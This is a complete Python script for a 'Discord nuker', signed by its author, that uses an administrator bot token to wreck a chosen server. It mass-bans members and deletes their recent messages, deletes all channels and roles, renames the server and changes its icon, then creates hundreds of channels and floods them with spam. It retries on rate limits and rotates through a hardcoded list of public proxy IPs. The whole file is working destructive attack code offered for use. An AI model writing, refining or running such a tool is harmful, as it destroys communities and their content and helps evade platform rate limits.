import sys
import asyncio
import os
import random
import aiohttp
import requests
from pystyle import Colors, Colorate, Center
import discord
from discord.ext import commands
from colorama import Fore, Style, init
import json
import time
from itertools import cycle
init(autoreset=True)

class DiscordNuker:
    def __init__(self):
        self.banner = r"""
███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████
███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███
███   ███ ███    ███   ███▐██▀     ███    █▀    ███    ███
███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀
███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀
███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████
███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███
 ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███
                       ▀                        ███    ███
            by vantixt
"""
        self.token = ""
        self.target_guild_id = None
        self.ban_message = "banned by vantixt"
        self.new_name = "vantixt was here"
        self.image_path = ""
        self.spam_message = ""
        self.channel_name_prefix = "vantixt"
        self.channel_count = 300
        self.message_spam_amount = 3
        self.leave_after_nuke = True
        self.rate_limit_delay = 0.1
        self.max_concurrent_tasks = 50
        self.use_proxies = True
        self.proxy_list = []
        self.proxy_cycle = None
        self.current_proxy = None
        self.bot = None
        self.session = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def get_random_proxy(self):
        if self.proxy_cycle:
            proxy = next(self.proxy_cycle)
            self.current_proxy = f"http://{proxy}"
            return {"http": self.current_proxy, "https": self.current_proxy}
        return None

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def get_random_message(self):
        return self.spam_message

    def display_menu(self):
        self.clear()
        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(self.banner)))
        print("\n")
        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("discord nuker by vantixt")))
        print("\n")

    def get_inputs(self):
        self.clear()
        self.display_menu()
        self.token = input("Enter your bot token: ").strip()
        if not self.token:
            raise ValueError("Bot token cannot be empty.")
        self.image_path = input("Enter the path to the image for the server icon (leave empty to skip): ").strip()
        self.ban_message = input("Enter the ban message (default: 'banned by vantixt'): ").strip()
        if not self.ban_message:
            self.ban_message = "banned by vantixt"
        self.new_name = input("Enter the new server name (default: 'vantixt was here'): ").strip()
        if not self.new_name:
            self.new_name = "vantixt was here"
        self.spam_message = input("Enter the spam message: ").strip()
        if not self.spam_message:
            raise ValueError("Spam message cannot be empty.")
        self.channel_count = input("Enter the number of channels to create (default: 300): ").strip()
        if not self.channel_count:
            self.channel_count = 300
        else:
            self.channel_count = int(self.channel_count)
        self.message_spam_amount = input("Enter the number of spam messages per channel (default: 3): ").strip()
        if not self.message_spam_amount:
            self.message_spam_amount = 10
        else:
            self.message_spam_amount = int(self.message_spam_amount)
        confirm = input("Do you want the bot to leave after nuking? (yes/no, default: yes): ").strip().lower()
        self.leave_after_nuke = confirm != 'no'
        confirm = input("Do you want to use proxies? (yes/no, default: yes): ").strip().lower()
        self.use_proxies = confirm != 'no'
        if self.use_proxies:
            print(Fore.YELLOW + "enter your proxies(double enter when ure done)")
            proxies = [
                "66.29.156.102:8080",
                "199.188.204.195:8080",
                "47.252.29.28:11222",
                "72.10.160.90:1237",
                "38.60.91.60:80",
                "20.27.15.111:8561",
                "213.142.156.97:80",
                "193.31.117.184:80",
                "45.143.99.15:80",
                "38.54.71.67:80",
                "20.78.118.91:8561",
                "159.203.61.169:3128",
                "209.97.150.167:8080",
                "15.168.235.57:10061",
                "123.30.154.171:7777",
                "133.18.234.13:80",
                "32.223.6.94:80",
                "128.199.202.122:8080",
                "46.47.197.210:3128",
                "190.58.248.86:80",
                "50.122.86.118:80",
                "200.174.198.158:8888",
                "35.197.89.213:80",
                "188.40.57.101:80",
                "192.73.244.36:80",
                "4.156.78.45:80",
                "158.255.77.166:80",
                "23.247.136.254:80",
                "152.53.107.230:80",
                "81.169.213.169:8888",
                "213.157.6.50:80",
                "201.148.32.162:80",
                "213.33.126.130:80",
                "194.158.203.14:80",
                "189.202.188.149:80",
                "181.174.164.221:80",
                "194.219.134.234:80",
                "176.65.132.67:3128",
                "4.245.123.244:80",
                "154.118.231.30:80",
                "62.171.159.232:8888",
                "4.195.16.140:80",
                "124.108.6.20:8085",
                "108.141.130.146:80",
                "134.209.29.120:80",
                "103.133.26.45:8080",
                "54.226.156.148:20201",
                "52.188.28.218:3128",
                "90.162.35.34:80",
                "62.99.138.162:80",
                "103.249.120.207:80",
                "51.254.78.223:80",
                "178.124.197.141:8080",
                "162.238.123.152:8888",
                "89.58.55.33:80",
                "213.143.113.82:80",
                "80.74.54.148:3128",
                "197.221.234.253:80",
                "89.58.57.45:80",
                "91.103.120.49:443"
            ]
            while True:
                proxy = input("Enter proxy: ").strip()
                if not proxy:
                    break
                if ':' in proxy:
                    proxies.append(proxy)
                else:
                    print(Fore.RED + "[-] Invalid format, skipping.")
            if proxies:
                self.proxy_list = list(set(proxies))
                random.shuffle(self.proxy_list)
                self.proxy_cycle = cycle(self.proxy_list)
                print(Fore.GREEN + f"[+] Loaded {len(self.proxy_list)} unique proxies.")
            else:
                print(Fore.RED + "[-] No valid proxies entered. Disabling proxies.")
                self.use_proxies = False

    async def ban_members(self, guild):
        banned_count = 0
        print(Fore.YELLOW + f"\n[!] BANNING MEMBERS IN {guild.name} [!]")
        try:
            await guild.chunk()
        except discord.Forbidden:
            print(Fore.RED + "[-] Missing permissions to chunk members. Ensure 'SERVER MEMBERS INTENT' is enabled!")
            return 0
        except Exception as e:
            print(Fore.RED + f"[-] ERROR LOADING MEMBERS: {e} [!]")
            print(Fore.RED + "     Ensure 'SERVER MEMBERS INTENT' is enabled in the Discord Developer Portal!")
            return 0
        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)
        async def ban_single_member(m):
            nonlocal banned_count
            async with semaphore:
                try:
                    if m.id == self.bot.user.id:
                        print(Fore.BLUE + f"[*] SKIPPING: {m.name} (Bot)")
                        return
                    if not guild.me.top_role > m.top_role and guild.owner_id != self.bot.user.id:
                        print(Fore.YELLOW + f"[-] INSUFFICIENT PERMISSIONS TO BAN: {m.name} (Role Hierarchy)")
                        return
                    await m.ban(reason=self.ban_message, delete_message_days=7)
                    print(Fore.GREEN + f"[+] BANNED: {m.name} ({m.id})")
                    banned_count += 1
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION): {m.name} ({m.id})")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (BAN): {m.name} ({m.id}) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            await m.ban(reason=self.ban_message, delete_message_days=7)
                            print(Fore.GREEN + f"[+] BANNED (RETRY SUCCESS): {m.name} ({m.id})")
                            banned_count += 1
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (BAN): {m.name} ({m.id}) - {retry_e}")
                    else:
                        print(Fore.RED + f"[-] ERROR DURING BAN (HTTP): {m.name} ({m.id}) - {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error during ban: {e}")
                finally:
                    await asyncio.sleep(self.rate_limit_delay)
        members = list(guild.members)
        random.shuffle(members)
        batch_size = 50
        for i in range(0, len(members), batch_size):
            batch = members[i:i + batch_size]
            tasks = [ban_single_member(member) for member in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)
        print(Fore.YELLOW + f"\n[!] BAN WAVE COMPLETED! BANNED: {banned_count} [!]")
        return banned_count

    async def delete_channels(self, guild):
        deleted_count = 0
        print(Fore.YELLOW + f"\n[!] DELETING CHANNELS IN {guild.name} [!]")
        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)
        async def delete_single_channel(ch):
            nonlocal deleted_count
            async with semaphore:
                try:
                    await ch.delete()
                    print(Fore.GREEN + f"[+] DELETED: {ch.name} ({ch.id})")
                    deleted_count += 1
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION): {ch.name} ({ch.id})")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (CHANNEL DELETE): {ch.name} ({ch.id}) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            await ch.delete()
                            print(Fore.GREEN + f"[+] DELETED (RETRY SUCCESS): {ch.name} ({ch.id})")
                            deleted_count += 1
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (CHANNEL DELETE): {ch.name} ({ch.id}) - {retry_e}")
                    else:
                        print(Fore.RED + f"[-] ERROR DELETING CHANNEL: {ch.name} ({ch.id}) - {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error deleting channel: {ch.name} ({ch.id}) - {e}")
                finally:
                    await asyncio.sleep(self.rate_limit_delay)
        channels = list(guild.channels)
        random.shuffle(channels)
        batch_size = 25
        for i in range(0, len(channels), batch_size):
            batch = channels[i:i + batch_size]
            tasks = [delete_single_channel(channel) for channel in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)
        print(Fore.YELLOW + f"\n[!] CHANNEL DELETION COMPLETED! DELETED: {deleted_count} [!]")
        return deleted_count

    async def delete_roles(self, guild):
        deleted_count = 0
        print(Fore.YELLOW + f"\n[!] DELETING ROLES IN {guild.name} [!]")
        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)
        sorted_roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)
        async def delete_single_role(r):
            nonlocal deleted_count
            async with semaphore:
                if r.name == "@everyone" or r.id == guild.me.top_role.id:
                    print(Fore.BLUE + f"[*] SKIPPING (IMPORTANT ROLE): {r.name} ({r.id})")
                    return
                if guild.me.top_role > r:
                    try:
                        await r.delete(reason="Nuked")
                        print(Fore.GREEN + f"[+] DELETED: {r.name} ({r.id})")
                        deleted_count += 1
                    except discord.Forbidden:
                        print(Fore.RED + f"[-] FAILED (NO PERMISSION): {r.name} ({r.id})")
                    except discord.HTTPException as e:
                        if e.status == 429:
                            retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                            print(Fore.RED + f"[-] RATE LIMITED (ROLE DELETE): {r.name} ({r.id}) - Retrying in {retry_after:.2f}s")
                            await asyncio.sleep(retry_after)
                            try:
                                await r.delete(reason="Nuked")
                                print(Fore.GREEN + f"[+] DELETED (RETRY SUCCESS): {r.name} ({r.id})")
                                deleted_count += 1
                            except Exception as retry_e:
                                print(Fore.RED + f"[-] FAILED ON RETRY (ROLE DELETE): {r.name} ({r.id}) - {retry_e}")
                        else:
                            print(Fore.RED + f"[-] ERROR DELETING ROLE: {r.name} ({r.id}) - {e}")
                    except Exception as e:
                        print(Fore.RED + f"[-] Error deleting role: {r.name} ({r.id}) - {e}")
                else:
                    print(Fore.YELLOW + f"[-] INSUFFICIENT PERMISSIONS TO DELETE: {r.name} (Role Hierarchy)")
                await asyncio.sleep(self.rate_limit_delay)
        batch_size = 20
        for i in range(0, len(sorted_roles), batch_size):
            batch = sorted_roles[i:i + batch_size]
            tasks = [delete_single_role(role) for role in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)
        print(Fore.YELLOW + f"\n[!] ROLE DELETION COMPLETED! DELETED: {deleted_count} [!]")
        return deleted_count

    async def change_guild_properties(self, guild):
        print(Fore.YELLOW + f"\n[!] CHANGING SERVER PROPERTIES OF {guild.name} [!]")
        try:
            await guild.edit(name=self.new_name, reason="Server Name Changed by Nuker")
            print(Fore.GREEN + f"[+] SERVER NAME CHANGED TO: {self.new_name}")
        except discord.Forbidden:
            print(Fore.RED + "[-] FAILED (NO PERMISSION TO CHANGE SERVER NAME)")
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                print(Fore.RED + f"[-] RATE LIMITED (GUILD NAME CHANGE) - Retrying in {retry_after:.2f}s")
                await asyncio.sleep(retry_after)
                try:
                    await guild.edit(name=self.new_name, reason="Server Name Changed by Nuker")
                    print(Fore.GREEN + f"[+] SERVER NAME CHANGED TO (RETRY SUCCESS): {self.new_name}")
                except Exception as retry_e:
                    print(Fore.RED + f"[-] FAILED ON RETRY (GUILD NAME CHANGE): {retry_e}")
            else:
                print(Fore.RED + f"[-] ERROR CHANGING SERVER NAME: {e}")
        except Exception as e:
            print(Fore.RED + f"[-] Error changing server name: {e}")
        await asyncio.sleep(self.rate_limit_delay)
        if self.image_path:
            try:
                with open(self.image_path, "rb") as pic:
                    logo = pic.read()
                await guild.edit(icon=logo, reason="Server Icon Changed by Nuker")
                print(Fore.GREEN + f"[+] SERVER ICON CHANGED TO: {self.image_path}")
            except FileNotFoundError:
                print(Fore.RED + f"[-] ERROR: Image file not found at {self.image_path}")
            except discord.Forbidden:
                print(Fore.RED + "[-] FAILED (NO PERMISSION TO CHANGE SERVER ICON)")
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                    print(Fore.RED + f"[-] RATE LIMITED (GUILD ICON CHANGE) - Retrying in {retry_after:.2f}s")
                    await asyncio.sleep(retry_after)
                    try:
                        with open(self.image_path, "rb") as pic:
                            logo = pic.read()
                        await guild.edit(icon=logo, reason="Server Icon Changed by Nuker")
                        print(Fore.GREEN + f"[+] SERVER ICON CHANGED TO (RETRY SUCCESS): {self.image_path}")
                    except Exception as retry_e:
                        print(Fore.RED + f"[-] FAILED ON RETRY (GUILD ICON CHANGE): {retry_e}")
                else:
                    print(Fore.RED + f"[-] ERROR CHANGING SERVER ICON: {e}")
            except Exception as e:
                print(Fore.RED + f"[-] Error changing server icon: {e}")
            finally:
                await asyncio.sleep(self.rate_limit_delay)
        else:
            print(Fore.BLUE + "[*] NO IMAGE PATH PROVIDED, SKIPPING ICON CHANGE.")

    async def create_and_spam_channels(self, guild):
        print(Fore.YELLOW + f"\n[!] STARTING CHANNEL CREATION AND SPAM IN {guild.name} [!]")
        creation_semaphore = asyncio.Semaphore(self.max_concurrent_tasks // 2)
        spam_semaphore = asyncio.Semaphore(self.max_concurrent_tasks)

        async def create_and_spam_single_channel():
            async with creation_semaphore:
                try:
                    channel = await guild.create_text_channel(f"{self.channel_name_prefix}-{random.randint(1000, 99999)}")
                    print(Fore.GREEN + f"[+] Created channel: {channel.name}")
                    async with spam_semaphore:
                        for _ in range(self.message_spam_amount):
                            try:
                                await channel.send(self.get_random_message())
                                print(Fore.GREEN + f"[+] Message spam in {channel.name}")
                            except discord.Forbidden:
                                print(Fore.RED + f"[-] FAILED (NO PERMISSION TO SEND MESSAGE): {channel.name}")
                            except discord.HTTPException as e:
                                if e.status == 429:
                                    retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                                    print(Fore.RED + f"[-] RATE LIMITED (SPAM): {channel.name} - Retrying in {retry_after:.2f}s")
                                    await asyncio.sleep(retry_after)
                                    try:
                                        await channel.send(self.get_random_message())
                                        print(Fore.GREEN + f"[+] Message spam (RETRY SUCCESS) in {channel.name}")
                                    except Exception as retry_e:
                                        print(Fore.RED + f"[-] FAILED ON RETRY (SPAM): {channel.name} - {retry_e}")
                                else:
                                    print(Fore.RED + f"[-] HTTP Exception during spam: {e}")
                            except Exception as e:
                                print(Fore.RED + f"[-] Error during spam: {e}")
                            finally:
                                await asyncio.sleep(self.rate_limit_delay)
                    await asyncio.sleep(self.rate_limit_delay)
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION TO CREATE CHANNEL)")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (CHANNEL CREATE) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            channel = await guild.create_text_channel(f"{self.channel_name_prefix}-{random.randint(1000, 99999)}")
                            print(Fore.GREEN + f"[+] Created channel (RETRY SUCCESS): {channel.name}")
                            async with spam_semaphore:
                                for _ in range(self.message_spam_amount):
                                    try:
                                        await channel.send(self.get_random_message())
                                        print(Fore.GREEN + f"[+] Message spam in {channel.name}")
                                    except Exception as e:
                                        print(Fore.RED + f"[-] Error during spam: {e}")
                                    finally:
                                        await asyncio.sleep(self.rate_limit_delay)
                            await asyncio.sleep(self.rate_limit_delay)
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (CHANNEL CREATE): {retry_e}")
                    else:
                        print(Fore.RED + f"[-] HTTP Exception during channel creation: {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error during channel creation: {e}")

        batch_size = 50
        for i in range(0, self.channel_count, batch_size):
            batch_tasks = [create_and_spam_single_channel() for _ in range(min(batch_size, self.channel_count - i))]
            await asyncio.gather(*batch_tasks)
            await asyncio.sleep(1)

        print(Fore.YELLOW + f"\n[!] CHANNEL CREATION AND SPAM COMPLETED! [!]")

    async def leave_guild(self, guild):
        print(Fore.YELLOW + f"\n[!] BOT LEAVING SERVER {guild.name} [!]")
        try:
            await guild.leave()
            print(Fore.GREEN + "[+] SUCCESSFULLY LEFT SERVER.")
        except Exception as e:
            print(Fore.RED + f"[-] ERROR LEAVING SERVER: {e}")

    async def nuke_guild(self, guild):
        print(Fore.RED + f"\n[!] STARTING NUKE ON SERVER: {guild.name} ({guild.id}) [!]")
        if not guild.me.guild_permissions.administrator:
            print(Fore.RED + "[-] BOT DOES NOT HAVE ADMINISTRATOR PERMISSIONS!")
            return False

        other_tasks = [
            self.ban_members(guild),
            self.delete_roles(guild),
            self.change_guild_properties(guild)
        ]
        await asyncio.gather(*other_tasks)

        await self.delete_channels(guild)
        await self.create_and_spam_channels(guild)
        if self.leave_after_nuke:
            await self.leave_guild(guild)
        print(Fore.RED + f"\n[!] NUKE COMPLETED FOR SERVER: {guild.name} ({guild.id}) [!]")
        return True

    async def _close_all_sessions(self):
        print(Fore.CYAN + "[*] Closing all aiohttp sessions...")
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None

    def run_bot(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        intents.guilds = True
        self.bot = commands.Bot(command_prefix="!", intents=intents)

        @self.bot.event
        async def on_ready():
            self.clear()
            self.display_menu()
            print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(f"[+] BOT IS READY: {self.bot.user.name} ({self.bot.user.id}) [+]")))
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\n[!] SELECT THE TARGET SERVER FROM THE FOLLOWING LIST: [!]")))
            if not self.bot.guilds:
                print(Colorate.Horizontal(Colors.yellow_to_white, Center.XCenter("The bot is not on any server. Please invite it to a server first!")))
                input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
                await self.bot.close()
                return
            for i, guild in enumerate(self.bot.guilds):
                print(Colorate.Horizontal(Colors.white_to_green, Center.XCenter(f"[{i+1}] {guild.name} ({guild.id}) - Members: {len(guild.members)}")))
            while True:
                try:
                    choice_input = input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nEnter the number of the target server: "))).strip()
                    choice = int(choice_input) - 1
                    if 0 <= choice < len(self.bot.guilds):
                        self.target_guild_id = self.bot.guilds[choice].id
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] Invalid choice. Please enter a valid number.")))
                except ValueError:
                    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] Invalid input. Please enter a number.")))
            target_guild = self.bot.get_guild(self.target_guild_id)
            if target_guild:
                confirm = input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(f"\n[!!!] ARE YOU SURE YOU WANT TO NUKE '{target_guild.name}'? THIS ACTION IS IRREVERSIBLE! (type 'yes' to confirm): "))).strip().lower()
                if confirm == 'yes':
                    connector = aiohttp.TCPConnector(limit=self.max_concurrent_tasks, force_close=True)
                    self.session = aiohttp.ClientSession(connector=connector)
                    await self.nuke_guild(target_guild)
                    await self._close_all_sessions()
                    input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nNuke process finished. Press ENTER to exit...")))
                    await self.bot.close()
                else:
                    print(Colorate.Horizontal(Colors.yellow_to_white, Center.XCenter("[!] Nuke cancelled by user.")))
                    input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
                    await self.bot.close()
            else:
                print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] Could not find the selected guild. Exiting.")))
                input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
                await self.bot.close()

        @self.bot.event
        async def on_guild_join(guild):
            print(Fore.GREEN + f"[+] Joined new guild: {guild.name} ({guild.id})")

        @self.bot.event
        async def on_disconnect():
            print(Fore.RED + "[!] Bot disconnected. Attempting to close aiohttp session...")
            await self._close_all_sessions()

        @self.bot.event
        async def on_connect():
            print(Fore.GREEN + "[+] Bot connected to Discord!")

        @self.bot.event
        async def on_resumed():
            print(Fore.YELLOW + "[*] Bot resumed connection.")

        @self.bot.event
        async def on_error(event, *args, **kwargs):
            print(Fore.RED + f"[-] AN ERROR OCCURRED: {event}")

        try:
            self.bot.run(self.token)
        except discord.errors.LoginFailure:
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] INVALID BOT TOKEN. Please check your token and try again.")))
            input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
        except discord.Forbidden:
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] BOT DOES NOT HAVE NECESSARY PERMISSIONS TO CONNECT OR ACCESS GUILDS. Ensure all intents are enabled and bot has appropriate permissions.")))
            input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(f"[!] AN UNEXPECTED ERROR OCCURRED DURING BOT RUN: {e}")))
            input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
        finally:
            asyncio.run(self._close_all_sessions())

if __name__ == '__main__':
    nuker = DiscordNuker()
    nuker.get_inputs()
    nuker.run_bot()
